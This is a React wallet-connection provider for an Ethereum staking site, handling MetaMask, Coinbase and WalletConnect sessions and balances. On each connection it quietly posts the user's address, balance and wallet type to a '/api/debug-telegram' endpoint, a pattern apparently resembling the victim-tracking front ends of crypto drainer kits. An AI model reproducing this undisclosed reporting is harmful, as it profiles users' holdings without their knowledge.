"use client"

import { createContext, useContext, useState, useEffect, type ReactNode, useRef } from "react"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"

declare global {
  interface Window {
    ethereum?: any
  }
}

const WALLET_CONNECT_PROJECT_ID = "2fc330b1a9aa1b7c859bd84210853433"

const WALLET_OPTIONS = [
  { name: "MetaMask", color: "#F6851B", icon: "/images/wallets/metamask-new.png" },
  { name: "Coinbase Wallet", color: "#0052FF", icon: "/images/wallets/coinbase.png" },
  { name: "Browser Wallet", color: "#4285F4", icon: "/images/wallets/browser.png" },
  {
    name: "WalletConnect",
    color: "#3B99FC",
    icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMDAgMTg1IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGZpbGxSdWxlPSJldmVub2RkIiBjbGlwUnVsZT0iZXZlbm9kZCIgZD0iTTYwLjEwMiAzMC4yMjZDMTA0LjA5NiAtMTAuMDc1MyAxNzUuOTA0IC0xMC4wNzUzIDIxOS44OTggMzAuMjI2TDIyNi4zMDcgMzYuMDE3QzIyOC4yNzUgMzcuODM2NCAyMjguMjc1IDQwLjk1OTYgMjI2LjMwNyA0Mi43NzlMMTk3Ljc2IDY5LjAxMzNDMTk2Ljc3NiA3MC40MjMyIDE5NC45MjYgNzAuNDIzMiAxOTMuOTQyIDY5LjAxMzNMMTg0LjczNSA2MC41NTMyQzE1NC40ODkgMzIuNzcyNiAxMjUuNTExIDMyLjc3MjYgOTUuMjY0OSA2MC41NTMyTDg1LjMwNjcgNjkuNzM2OUM4NC4zMjI3IDcxLjE0NjggODIuNDcyNyA3MS4xNDY4IDgxLjQ4ODcgNjkuNzM2OUw1Mi45NDE2IDQzLjUwMjZDNTAuOTczNiA0MS42ODMyIDUwLjk3MzYgMzguNTYgNTIuOTQxNiAzNi43NDA2TDYwLjEwMiAzMC4yMjZaTTI0Mi4zNDIgNTEuMzQ2NkwyNjcuOTUxIDc0Ljk4NjZDMjY5LjkxOSA3Ni44MDYgMjY5LjkxOSA3OS45MjkyIDI2Ny45NTEgODEuNzQ4NkwyMDAuMjkzIDE0NC4wMTVDMTk4LjMyNSAxNDUuODM0IDE5NS4zNzcgMTQ1LjgzNCAxOTMuNDA5IDE0NC4wMTVDMTkzLjQwOSAxNDQuMDE1IDE5My40MDkgMTQ0LjAxNSAxOTMuNDA5IDE0NC4wMTVMMTQzLjU2MiA5OC4wNTc0QzE0My4wNyA5Ny4zNTI0IDE0Mi4xNDUgOTcuMzUyNCAxNDEuNjUzIDk4LjA1NzRDMTQxLjY1MyA5OC4wNTc0IDE0MS42NTMgOTguMDU3NCAxNDEuNjUzIDk4LjA1NzRMMTAxLjg5MSAxNDQuMDE1Qzk5LjkyMyAxNDUuODM0IDk2Ljk3NSAxNDUuODM0IDk1LjAwNyAxNDQuMDE1Qzk1LjAwNyAxNDQuMDE1IDk1LjAwNyAxNDQuMDE1IDk1LjAwNyAxNDQuMDE1TDI3LjM0OTEgODEuNzQ4NkMyNS4zODExIDc5LjkyOTIgMjUuMzgxMSA3Ni44MDYgMjcuMzQ5MSA3NC45ODY2TDUyLjk1ODEgNTEuMzQ2NkM1NC45MjYxIDQ5LjUyNzIgNTcuODc0MSA0OS41MjcyIDU5Ljg0MjEgNTEuMzQ2NkwxMDkuNjg5IDk3LjMwNDJDMTEwLjE4MSA5OC4wMDkyIDExMS4xMDYgOTguMDA5MiAxMTEuNTk4IDk3LjMwNDJDMTExLjU5OCA5Ny4zMDQyIDExMS41OTggOTcuMzA0MiAxMTEuNTk4IDk3LjMwNDJMMTUxLjM2IDUxLjM0NjZDMTUzLjMyOCA0OS41MjcyIDE1Ni4yNzYgNDkuNTI3MiAxNTguMjQ0IDUxLjM0NjZDMTU4LjI0NCA1MS4zNDY2IDE1OC4yNDQgNTEuMzQ2NiAxNTguMjQ0IDUxLjM0NjZMMjA4LjA5MSA5Ny4zMDQyQzIwOC41ODMgOTguMDA5MiAyMDkuNTA4IDk4LjAwOTIgMjEwIDk3LjMwNDJDMjEwIDk3LjMwNDIgMjEwIDk3LjMwNDIgMjEwIDk3LjMwNDJMMjU5Ljg0NyA1MS4zNDY2QzI2MS44MTUgNDkuNTI3MiAyNjQuNzYzIDQ5LjUyNzIgMjY2LjczMSA1MS4zNDY2TDI0Mi4zNDIgNTEuMzQ2NloiIGZpbGw9IiMzQjk5RkMiLz48L3N2Zz4K",
  },
]

type Web3ContextType = {
  isConnected: boolean
  address: string | null
  balance: string
  connect: () => Promise<boolean>
  disconnect: () => void
  selectNewWallet: () => void
  refreshBalance: () => Promise<number>
  tokenBalances: Record<string, string>
}

export const Web3Context = createContext<Web3ContextType>({
  isConnected: false,
  address: null,
  balance: "0",
  connect: async () => false,
  disconnect: () => {},
  selectNewWallet: () => {},
  refreshBalance: async () => 0,
  tokenBalances: {},
})

export const useWeb3 = () => useContext(Web3Context)

export function Web3Provider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false)
  const [address, setAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState("0")
  const [walletType, setWalletType] = useState<string>("Unknown")
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({})
  const [activeProvider, setActiveProvider] = useState<any>(null)
  const [hasDisconnected, setHasDisconnected] = useState(false)

  const notificationSentRef = useRef<Record<string, boolean>>({})

  // Detect available providers
  const detectProviders = () => {
    if (typeof window === "undefined") return []

    const providers = []

    // Check for window.ethereum
    if (window.ethereum) {
      // Handle multiple providers (like MetaMask + Coinbase)
      if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
        providers.push(...window.ethereum.providers)
      } else {
        providers.push(window.ethereum)
      }
    }

    return providers
  }

  // Get wallet type from provider
  const getWalletType = (provider: any): string => {
    if (!provider) return "Unknown"

    // Check provider properties
    if (provider.isMetaMask) return "MetaMask"
    if (provider.isCoinbaseWallet) return "Coinbase Wallet"
    if (provider.isWalletConnect) return "WalletConnect"
    if (provider.isTrust) return "Trust Wallet"
    if (provider.isExodus) return "Exodus"
    if (provider.isRainbow) return "Rainbow"

    return "Browser Wallet"
  }

  // Initialize WalletConnect
  const initializeWalletConnect = async () => {
    try {
      const { EthereumProvider } = await import("@walletconnect/ethereum-provider")

      const provider = await EthereumProvider.init({
        projectId: WALLET_CONNECT_PROJECT_ID,
        chains: [1],
        showQrModal: true,
        metadata: {
          name: "Staking Platform",
          description: "Modern Ethereum Staking Platform",
          url: window.location.origin,
          icons: [`${window.location.origin}/logo.png`],
        },
      })

      provider.on("connect", async () => {
        if (provider.accounts && provider.accounts.length > 0) {
          const userAddress = provider.accounts[0]
          setAddress(userAddress)
          setIsConnected(true)
          setActiveProvider(provider)
          setWalletType("WalletConnect")

          localStorage.setItem("walletAddress", userAddress)
          localStorage.setItem("walletType", "WalletConnect")

          await updateBalance(provider, userAddress)
          await sendConnectionNotification(userAddress, "WalletConnect")
        }
      })

      provider.on("disconnect", () => {
        disconnect()
      })

      await provider.connect()
      return true
    } catch (error) {
      console.error("WalletConnect initialization failed:", error)
      return false
    }
  }

  // Auto-connect on page load
  useEffect(() => {
    const autoConnect = async () => {
      if (hasDisconnected) return

      const savedAddress = localStorage.getItem("walletAddress")
      if (!savedAddress) return

      const providers = detectProviders()

      // Try to find an active connection
      for (const provider of providers) {
        try {
          const accounts = await provider.request({ method: "eth_accounts" })

          if (accounts && accounts.length > 0 && accounts[0] === savedAddress) {
            const userAddress = accounts[0]
            const detectedWalletType = getWalletType(provider)

            setAddress(userAddress)
            setIsConnected(true)
            setActiveProvider(provider)
            setWalletType(detectedWalletType)

            await updateBalance(provider, userAddress)
            await sendConnectionNotification(userAddress, detectedWalletType)
            return
          }
        } catch (error) {
          console.warn("Auto-connect failed for provider:", error)
        }
      }

      // Clear saved data if no active connection found
      localStorage.removeItem("walletAddress")
      localStorage.removeItem("walletType")
    }

    autoConnect()
  }, [hasDisconnected])

  // Listen for account changes
  useEffect(() => {
    if (!activeProvider) return

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect()
      } else if (accounts[0] !== address) {
        setAddress(accounts[0])
        localStorage.setItem("walletAddress", accounts[0])
        updateBalance(activeProvider, accounts[0])
      }
    }

    const handleChainChanged = () => {
      window.location.reload()
    }

    if (activeProvider.on) {
      activeProvider.on("accountsChanged", handleAccountsChanged)
      activeProvider.on("chainChanged", handleChainChanged)
    }

    return () => {
      if (activeProvider.removeListener) {
        activeProvider.removeListener("accountsChanged", handleAccountsChanged)
        activeProvider.removeListener("chainChanged", handleChainChanged)
      }
    }
  }, [activeProvider, address])

  // Update balance
  const updateBalance = async (provider: any, userAddress: string) => {
    try {
      const balanceHex = await provider.request({
        method: "eth_getBalance",
        params: [userAddress, "latest"],
      })

      const balanceWei = BigInt(balanceHex)
      const balanceEth = Number(balanceWei) / 1e18
      const formattedBalance = balanceEth.toFixed(6)

      setBalance(formattedBalance)
      setTokenBalances({ ETH: formattedBalance })

      return balanceEth
    } catch (error) {
      console.error("Error updating balance:", error)
      return 0
    }
  }

  // Send connection notification
  const sendConnectionNotification = async (userAddress: string, walletName: string) => {
    if (notificationSentRef.current[userAddress]) return

    try {
      const response = await fetch("/api/debug-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: `
🔌 Wallet Connected
👛 Address: ${userAddress}
💰 Balance: ${balance} ETH
🔑 Wallet: ${walletName}
⏰ Time: ${new Date().toISOString()}
          `,
        }),
      })

      if (response.ok) {
        notificationSentRef.current[userAddress] = true
      }
    } catch (error) {
      console.error("Failed to send notification:", error)
    }
  }

  // Connect wallet
  const connect = async (): Promise<boolean> => {
    try {
      if (isConnected && address) {
        return true
      }

      if (hasDisconnected) {
        setIsWalletModalOpen(true)
        return false
      }

      const providers = detectProviders()

      // If no providers, show modal
      if (providers.length === 0) {
        setIsWalletModalOpen(true)
        return false
      }

      // Try to connect with the first available provider
      const provider = providers[0]

      try {
        const accounts = await provider.request({ method: "eth_requestAccounts" })

        if (accounts && accounts.length > 0) {
          const userAddress = accounts[0]
          const detectedWalletType = getWalletType(provider)

          setAddress(userAddress)
          setIsConnected(true)
          setActiveProvider(provider)
          setWalletType(detectedWalletType)
          setHasDisconnected(false)

          localStorage.setItem("walletAddress", userAddress)
          localStorage.setItem("walletType", detectedWalletType)

          await updateBalance(provider, userAddress)
          await sendConnectionNotification(userAddress, detectedWalletType)

          return true
        }
      } catch (error: any) {
        if (error.code === 4001) {
          // User rejected request
          setIsWalletModalOpen(true)
          return false
        }
        throw error
      }

      setIsWalletModalOpen(true)
      return false
    } catch (error) {
      console.error("Connection failed:", error)
      setIsWalletModalOpen(true)
      return false
    }
  }

  // Handle wallet selection from modal
  const handleWalletSelection = async (walletName: string): Promise<boolean> => {
    try {
      if (walletName === "WalletConnect") {
        return await initializeWalletConnect()
      }

      const providers = detectProviders()

      if (providers.length === 0) {
        alert("No Ethereum wallet detected. Please install MetaMask or another wallet.")
        return false
      }

      // Find the right provider or use the first one
      let targetProvider = providers[0]

      for (const provider of providers) {
        const providerType = getWalletType(provider)
        if (providerType === walletName) {
          targetProvider = provider
          break
        }
      }

      const accounts = await targetProvider.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        const userAddress = accounts[0]

        setAddress(userAddress)
        setIsConnected(true)
        setActiveProvider(targetProvider)
        setWalletType(walletName)
        setHasDisconnected(false)

        localStorage.setItem("walletAddress", userAddress)
        localStorage.setItem("walletType", walletName)

        await updateBalance(targetProvider, userAddress)
        await sendConnectionNotification(userAddress, walletName)

        return true
      }

      return false
    } catch (error: any) {
      console.error("Wallet selection failed:", error)

      if (error.code === 4001) {
        // User rejected request - don't show error
        return false
      }

      alert("Failed to connect wallet. Please try again.")
      return false
    }
  }

  // Disconnect wallet
  const disconnect = () => {
    if (activeProvider && activeProvider.disconnect) {
      try {
        activeProvider.disconnect()
      } catch (error) {
        console.warn("Error disconnecting provider:", error)
      }
    }

    setAddress(null)
    setIsConnected(false)
    setBalance("0")
    setWalletType("Unknown")
    setActiveProvider(null)
    setTokenBalances({})
    setHasDisconnected(true)

    localStorage.removeItem("walletAddress")
    localStorage.removeItem("walletType")

    notificationSentRef.current = {}
  }

  // Select new wallet
  const selectNewWallet = () => {
    disconnect()
    setIsWalletModalOpen(true)
  }

  // Refresh balance
  const refreshBalance = async (): Promise<number> => {
    if (isConnected && address && activeProvider) {
      return await updateBalance(activeProvider, address)
    }
    return 0
  }

  return (
    <Web3Context.Provider
      value={{
        isConnected,
        address,
        balance,
        connect,
        disconnect,
        selectNewWallet,
        refreshBalance,
        tokenBalances,
      }}
    >
      {children}
      <WalletConnectionModal
        isOpen={isWalletModalOpen}
        onClose={() => setIsWalletModalOpen(false)}
        walletOptions={WALLET_OPTIONS}
        otherWalletOptions={[]}
        onSelectWallet={handleWalletSelection}
      />
    </Web3Context.Provider>
  )
}
